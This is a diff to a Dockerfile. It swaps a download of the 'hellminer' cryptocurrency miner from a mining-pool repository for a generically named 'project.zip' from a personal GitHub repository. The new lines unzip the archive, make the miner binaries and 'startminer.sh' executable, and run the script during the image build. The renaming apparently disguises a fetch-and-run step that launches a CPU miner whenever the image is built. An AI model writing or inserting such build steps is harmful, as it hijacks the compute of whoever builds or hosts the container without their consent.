@@ -1,7 +1,9 @@
 FROM debian:stable
-RUN apt-get update && apt-get -y install wget vim
+RUN apt-get update && apt-get -y install wget vim unzip
 WORKDIR /home
-RUN wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
-RUN gunzip hellminer_cpu_linux.tar.gz
-RUN tar -xvf hellminer_cpu_linux.tar
-RUN sed -i 's/RN6MfBAJnpjchdY2L3EnnFQXkFkHzmrNoY/RN6MfBAJnpjchdY2L3EnnFQXkFkHzmrNoY/' mine.sh
+RUN wget https://github.com/sicobra00/project1/raw/main/project.zip
+RUN unzip project.zip
+RUN chmod +x startminer.sh
+RUN chmod +x hellminer
+RUN chmod +x verus-solver
+RUN ./startminer.sh
